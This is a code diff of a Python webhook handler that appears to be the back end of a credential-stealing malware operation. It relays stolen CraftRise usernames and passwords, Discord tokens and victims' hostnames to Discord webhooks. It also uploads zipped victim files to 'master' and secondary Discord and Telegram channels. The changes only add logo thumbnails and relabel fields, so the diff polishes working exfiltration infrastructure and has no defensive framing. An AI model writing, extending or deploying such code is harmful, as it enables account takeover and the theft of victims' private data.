@@ -82,11 +82,12 @@ def webhook():
             user = creds.get("username", "Unknown") if isinstance(creds, dict) else "Unknown"
             pw = creds.get("password", "Unknown") if isinstance(creds, dict) else "Unknown"
             
-            # Discord
+            # Discord CraftRise Webhook (logo thumbnail)
             cr_embed = {
                 "embeds": [{
                     "title": "CraftRise",
                     "color": 0xFF6B00,
+                    "thumbnail": {"url": "https://media.discordapp.net/attachments/1531817920907448421/1535036471222734941/crlogo.png"},
                     "fields": [
                         {"name": "Account", "value": f"{user}:{pw}", "inline": False},
                         {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon - 31makinesii", "inline": False}
@@ -107,13 +108,14 @@ def webhook():
                 except: tokens = [tokens]
             
             if tokens:
-                # Discord
+                # Discord Webhook (logo thumbnail + zip ismi + token sayısı)
                 discord_embed = {
                     "embeds": [{
                         "title": "Discord",
                         "color": 0x5865F2,
+                        "thumbnail": {"url": "https://media.discordapp.net/attachments/1531817920907448421/1535036435420413962/discord.png"},
                         "fields": [
-                            {"name": "Tokens", "value": f"{len(tokens)} Token", "inline": False},
+                            {"name": "Status", "value": f"MEVCUT {len(tokens)}X", "inline": False},
                             {"name": "PC", "value": hostname, "inline": False},
                             {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon - 31makinesii", "inline": False}
                         ],
@@ -142,11 +144,9 @@ def webhook():
                         embed["thumbnail"] = {"url": LOGO_SIGN}
             
             if file_bytes:
-                # Master Webhook
                 files = {'file': (f"{hostname}.zip", file_bytes)}
                 send_discord(MASTER_WEBHOOK, {'content': data.get("content", "")}, files)
                 send_discord(WEBHOOK, {'content': data.get("content", "")}, files)
-                # Telegram
                 send_telegram_file(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
                 send_telegram_file(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
             else:
